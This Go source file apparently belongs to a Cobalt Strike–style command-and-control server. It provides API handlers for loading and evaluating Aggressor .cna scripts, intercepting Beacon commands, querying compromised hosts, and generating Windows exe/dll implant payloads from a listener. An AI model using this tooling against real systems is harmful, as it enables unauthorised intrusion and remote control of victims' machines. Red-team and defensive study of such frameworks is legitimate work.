package api

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"

	"BackendTemplate/pkg/cna"
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/utils/logx"
)

// CnaScriptsDir 脚本目录名（相对服务端可执行目录，与 Plugins 平级）
const CnaScriptsDir = "scripts"

// CnaScriptsDirAbs 脚本目录绝对路径（解析后缓存）
var CnaScriptsDirAbs = ""

// GetCnaScriptsDir 解析并返回脚本目录（与插件目录同一解析规则）
func GetCnaScriptsDir() string {
	if CnaScriptsDirAbs != "" {
		return CnaScriptsDirAbs
	}
	if dir := resolveCnaDir(); dir != "" {
		CnaScriptsDirAbs = dir
		return dir
	}
	return CnaScriptsDir
}

func resolveCnaDir() string {
	exe, err := os.Executable()
	if err != nil {
		return ""
	}
	candidates := []string{
		filepath.Join(filepath.Dir(exe), CnaScriptsDir),
		filepath.Join(".", CnaScriptsDir),
	}
	if config.GetPluginDir() != "" {
		candidates = append(candidates, filepath.Join(filepath.Dir(config.GetPluginDir()), CnaScriptsDir))
	}
	for _, c := range candidates {
		info, err := os.Stat(c)
		if err == nil && info.IsDir() {
			return c
		}
	}
	// 默认创建
	dir := candidates[0]
	_ = os.MkdirAll(dir, 0o755)
	return dir
}

// ListCnaScripts 已加载脚本列表（含 scripts 目录下可用 .cna 文件）
func ListCnaScripts(c *gin.Context) {
	engine := cna.Global
	if engine == nil {
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": []cna.ScriptInfo{}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": engine.List()})
}

// ListCnaFiles scripts 目录下的 .cna 文件
func ListCnaFiles(c *gin.Context) {
	dir := GetCnaScriptsDir()
	_ = os.MkdirAll(dir, 0o755)
	files, err := os.ReadDir(dir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": "读取脚本目录失败: " + err.Error()})
		return
	}
	type fileInfo struct {
		Name string `json:"name"`
		Path string `json:"path"`
	}
	var out []fileInfo
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		if strings.HasSuffix(f.Name(), ".cna") {
			out = append(out, fileInfo{Name: f.Name(), Path: filepath.Join(dir, f.Name())})
		}
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": out})
}

// LoadCnaScript 加载脚本
func LoadCnaScript(c *gin.Context) {
	var req struct {
		Name string `json:"name"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "缺少脚本名"})
		return
	}
	if strings.Contains(req.Name, "..") || strings.Contains(req.Name, "/") || strings.Contains(req.Name, "\\") {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "脚本名不合法"})
		return
	}
	if cna.Global == nil {
		cna.InitEngine(GetCnaScriptsDir())
	}
	if _, err := cna.Global.Load(req.Name); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "加载失败: " + err.Error()})
		return
	}
	logx.Infof("[CNA] 加载脚本: %s\n", req.Name)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{"name": req.Name}})
}

// UnloadCnaScript 卸载脚本
func UnloadCnaScript(c *gin.Context) {
	var req struct {
		Name string `json:"name"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "缺少脚本名"})
		return
	}
	if cna.Global == nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "脚本引擎未初始化"})
		return
	}
	if err := cna.Global.Unload(req.Name); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": err.Error()})
		return
	}
	logx.Infof("[CNA] 卸载脚本: %s\n", req.Name)
	c.JSON(http.StatusOK, gin.H{"status": 200})
}

// ReloadCnaScript 重载脚本
func ReloadCnaScript(c *gin.Context) {
	var req struct {
		Name string `json:"name"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "缺少脚本名"})
		return
	}
	if cna.Global == nil {
		cna.InitEngine(GetCnaScriptsDir())
	}
	if err := cna.Global.Reload(req.Name); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": err.Error()})
		return
	}
	logx.Infof("[CNA] 重载脚本: %s\n", req.Name)
	c.JSON(http.StatusOK, gin.H{"status": 200})
}

// TestCnaScript 语法检查（不上载，仅解析）
func TestCnaScript(c *gin.Context) {
	var req struct {
		Content string `json:"content"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "请求体无效"})
		return
	}
	if _, err := cna.Parse(req.Content); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 200, "ok": false, "message": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "ok": true, "message": "语法检查通过"})
}

// UploadCnaScript 上传 .cna 脚本到 scripts 目录
func UploadCnaScript(c *gin.Context) {
	file, err := c.FormFile("script")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "获取上传文件失败: " + err.Error()})
		return
	}
	name := file.Filename
	if !strings.HasSuffix(name, ".cna") {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "仅支持 .cna 脚本"})
		return
	}
	if strings.Contains(name, "..") || strings.Contains(name, "/") || strings.Contains(name, "\\") {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "文件名不合法"})
		return
	}
	if file.Size > 5*1024*1024 {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "脚本过大（限制 5MB）"})
		return
	}
	dir := GetCnaScriptsDir()
	_ = os.MkdirAll(dir, 0o755)
	dst := filepath.Join(dir, name)
	if err := c.SaveUploadedFile(file, dst); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": "保存失败: " + err.Error()})
		return
	}
	logx.Infof("[CNA] 上传脚本: %s\n", name)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{"name": name, "path": dst}})
}

// publishCnaEvent 将脚本输出发布到事件总线（前端事件日志面板实时显示）
func publishCnaEvent(uid, source, output string) {
	if command.GlobalEventBus != nil && output != "" {
		command.PublishEvent(command.EventCmdOutput, uid, map[string]interface{}{
			"cmd":    source,
			"output": output,
		})
	}
}

// ExecCnaAlias 执行 alias 命令（Beacon 控制台命令拦截）
func ExecCnaAlias(c *gin.Context) {
	var req struct {
		Uid  string   `json:"uid"`
		Name string   `json:"name"`
		Args []string `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "缺少命令名"})
		return
	}
	if cna.Global == nil {
		c.JSON(http.StatusOK, gin.H{"status": 200, "hit": false})
		return
	}
	res, hit := cna.Global.ExecAlias(req.Name, req.Args, req.Uid)
	if !hit {
		c.JSON(http.StatusOK, gin.H{"status": 200, "hit": false})
		return
	}
	publishCnaEvent(req.Uid, "alias:"+req.Name, strings.Join(res.Output, "\n"))
	payload := gin.H{"status": 200, "hit": true, "output": res.Output}
	if res.Error != "" {
		payload["error"] = res.Error
	}
	c.JSON(http.StatusOK, payload)
}

// ListCnaMenus 已注册菜单
func ListCnaMenus(c *gin.Context) {
	if cna.Global == nil {
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": []cna.MenuView{}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": cna.Global.Menus()})
}

// ExecCnaMenuItem 执行菜单项
func ExecCnaMenuItem(c *gin.Context) {
	var req struct {
		Uid  string   `json:"uid"`
		Kind string   `json:"kind"`
		Path []string `json:"path"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Kind == "" || len(req.Path) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "缺少菜单信息"})
		return
	}
	if cna.Global == nil {
		c.JSON(http.StatusOK, gin.H{"status": 200, "hit": false})
		return
	}
	res, hit := cna.Global.ExecMenuItem(req.Kind, req.Path, req.Uid)
	if !hit {
		c.JSON(http.StatusOK, gin.H{"status": 200, "hit": false})
		return
	}
	publishCnaEvent(req.Uid, "menu:"+req.Kind, strings.Join(res.Output, "\n"))
	payload := gin.H{"status": 200, "hit": true, "output": res.Output}
	if res.Error != "" {
		payload["error"] = res.Error
	}
	c.JSON(http.StatusOK, payload)
}

// EvalCnaScript 交互式执行脚本片段（Aggressor 控制台 Eval）
func EvalCnaScript(c *gin.Context) {
	var req struct {
		Content string `json:"content"`
		Uid     string `json:"uid"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "请求体无效"})
		return
	}
	if cna.Global == nil {
		cna.InitEngine(GetCnaScriptsDir())
	}
	res := cna.Global.EvalScript(req.Content, req.Uid)
	publishCnaEvent(req.Uid, "eval", strings.Join(res.Output, "\n"))
	payload := gin.H{"status": 200, "output": res.Output}
	if res.Error != "" {
		payload["error"] = res.Error
	}
	c.JSON(http.StatusOK, payload)
}

// InitCnaBridge 初始化 CNA 引擎与桥接（main 启动时调用）
func InitCnaBridge() {
	dir := GetCnaScriptsDir()
	_ = os.MkdirAll(dir, 0o755)
	cna.InitEngine(dir)
	// 注入回调（在 main 中注册 sendcommand）
	RegisterCnaCallbacks()
}

// RegisterCnaCallbacks 注册引擎回调（默认实现由 InitCnaCallbacks 覆盖）
func RegisterCnaCallbacks() {
	// 脚本输出/告警直接 fmt.Printf（不经过 logx，避免被配置日志级别过滤，如 level: error）
	cna.EngineLog = func(kind, message string) {
		fmt.Printf("[CNA][%s] %s\n", kind, message)
	}
	cna.EventLog = func(script, event string, err error, output []string) {
		if err != nil {
			fmt.Printf("[CNA][ERROR] %s / %s: %v\n", script, event, err)
		}
	}
	cna.LhostFunc = func() string {
		return DefaultPublicHost()
	}
	cna.ListenersFunc = func() []cna.Value {
		return ListListenerNames()
	}
	cna.DataQueryFunc = cnaDataQuery
	cna.ArtifactPayloadFunc = cnaArtifactPayload
}

// cnaDataQuery 脚本级 data_query 数据查询（子集）：
// 支持 select .* / 指定列 from beacon(s)/listeners/targets [where 列 = 值]
func cnaDataQuery(query string) cna.Value {
	q := strings.ToLower(query)
	var rows []cna.Value
	switch {
	case strings.Contains(q, "from beacon"):
		rows = cnaQueryBeacons(q)
	case strings.Contains(q, "from listener"):
		rows = cnaQueryListeners(q)
	case strings.Contains(q, "from target"):
		rows = cnaQueryTargets(q)
	default:
		return []cna.Value{}
	}
	return rows
}

// cnaSelectCols 解析 select 列名（.* 返回 nil 表示全部）
func cnaSelectCols(q string) []string {
	sel := q
	if i := strings.Index(q, "select "); i >= 0 {
		sel = q[i+len("select "):]
	}
	if i := strings.Index(sel, " from "); i >= 0 {
		sel = sel[:i]
	}
	sel = strings.TrimSpace(sel)
	if sel == "" || sel == "*" || sel == ".*" {
		return nil
	}
	parts := strings.Split(sel, ",")
	var cols []string
	for _, p := range parts {
		cols = append(cols, strings.TrimSpace(p))
	}
	return cols
}

// cnaWhereCond 解析 where 条件（子集：列 = 值）
func cnaWhereCond(q string) (string, string, bool) {
	if i := strings.Index(q, " where "); i >= 0 {
		cond := strings.TrimSpace(q[i+len(" where "):])
		parts := strings.SplitN(cond, "=", 2)
		if len(parts) == 2 {
			col := strings.TrimSpace(parts[0])
			val := strings.Trim(strings.TrimSpace(parts[1]), `"'`)
			return col, val, true
		}
	}
	return "", "", false
}

// cnaFilterRow where 条件过滤（列名小写匹配）
func cnaFilterRow(row map[string]cna.Value, col, val string) bool {
	if col == "" {
		return true
	}
	for k, v := range row {
		if strings.ToLower(k) == col {
			return strings.ToLower(cna.ToString(v)) == strings.ToLower(val)
		}
	}
	return false
}

// cnaPick 按 select 列裁剪（cols 为 nil 表示全选）
func cnaPick(row map[string]cna.Value, cols []string) map[string]cna.Value {
	if cols == nil {
		return row
	}
	out := make(map[string]cna.Value)
	for _, c := range cols {
		key := strings.ToLower(c)
		for k, v := range row {
			if strings.ToLower(k) == key {
				out[k] = v
				break
			}
		}
	}
	return out
}

func cnaQueryBeacons(q string) []cna.Value {
	var list []database.Clients
	if err := database.Engine.Find(&list); err != nil {
		return nil
	}
	cols := cnaSelectCols(q)
	col, val, hasWhere := cnaWhereCond(q)
	var out []cna.Value
	for _, cl := range list {
		row := map[string]cna.Value{
			"uid":          cl.Uid,
			"external_ip":  cl.ExternalIP,
			"internal_ip":  cl.InternalIP,
			"username":     cl.Username,
			"computer":     cl.Computer,
			"process":      cl.Process,
			"pid":          cl.Pid,
			"arch":         cl.Arch,
			"listener":     cl.Listener,
			"online":       cl.Online,
			"last_active":  cl.LastActive,
			"first_start":  cl.FirstStart,
		}
		if hasWhere && !cnaFilterRow(row, col, val) {
			continue
		}
		out = append(out, cnaPick(row, cols))
	}
	return out
}

func cnaQueryListeners(q string) []cna.Value {
	var list []database.Listener
	if err := database.Engine.Find(&list); err != nil {
		return nil
	}
	cols := cnaSelectCols(q)
	var out []cna.Value
	for _, l := range list {
		row := map[string]cna.Value{
			"type":       l.Type,
			"listen_address": l.ListenAddress,
			"connect_address": l.ConnectAddress,
			"status":     ToIntStr(l.Status),
		}
		out = append(out, cnaPick(row, cols))
	}
	return out
}

func cnaQueryTargets(q string) []cna.Value {
	// targets 概念：未单独建表，复用 beacon 会话列表
	return cnaQueryBeacons(q)
}

func ToIntStr(v int) string {
	if v == 1 {
		return "1"
	}
	return "0"
}

// cnaArtifactPayload artifact_payload 生成：取一个监听器，patch 客户端模板
func cnaArtifactPayload(format, arch string) ([]byte, error) {
	listener, err := pickListener()
	if err != nil {
		return nil, err
	}
	arch = normalizeArch(arch)
	if arch == "" {
		arch = "amd64"
	}
	f := format
	switch f {
	case "svc-exe", "service", "exe-service":
		f = "exe"
	case "dll", "reflective-dll":
		f = "dll"
	}
	if f != "exe" && f != "dll" {
		return nil, fmt.Errorf("不支持的格式: %s（支持 exe/dll/svc-exe）", format)
	}
	bin, _, err := loadAndPatchClient(listener, "windows", arch, "", f)
	if err != nil {
		return nil, err
	}
	fmt.Printf("[CNA][artifact_payload] 生成 %s %s 载荷成功（listener: %s, %d bytes）\n", f, arch, listener, len(bin))
	return bin, nil
}

// normalizeArch 归一化 CS 架构名到模板命名（x64→amd64, x86/win32→386）
func normalizeArch(arch string) string {
	switch strings.ToLower(strings.TrimSpace(arch)) {
	case "x64", "amd64", "x86_64", "64":
		return "amd64"
	case "x86", "386", "i386", "win32", "32":
		return "386"
	case "arm64":
		return "arm64"
	}
	return arch
}

// pickListener 选择一个监听器构建 listener://address
func pickListener() (string, error) {
	var list []database.Listener
	if err := database.Engine.Find(&list); err != nil || len(list) == 0 {
		return "", fmt.Errorf("无可用监听器，请先创建监听器")
	}
	// 优先启用中的监听器
	for _, l := range list {
		if l.Status == 1 {
			return buildListenerStr(l), nil
		}
	}
	return buildListenerStr(list[0]), nil
}

func buildListenerStr(l database.Listener) string {
	addr := l.ConnectAddress
	if addr == "" {
		addr = l.ListenAddress
	}
	return strings.ToLower(l.Type) + "://" + addr
}

// DefaultPublicHost 默认监听主机
func DefaultPublicHost() string {
	return "127.0.0.1"
}

// ListListenerNames 监听器名列表
func ListListenerNames() []cna.Value {
	var out []cna.Value
	var listeners []database.Listener
	if err := database.Engine.Find(&listeners); err == nil {
		for _, l := range listeners {
			out = append(out, l.Type)
		}
	}
	return out
}

var _ = fmt.Sprintf
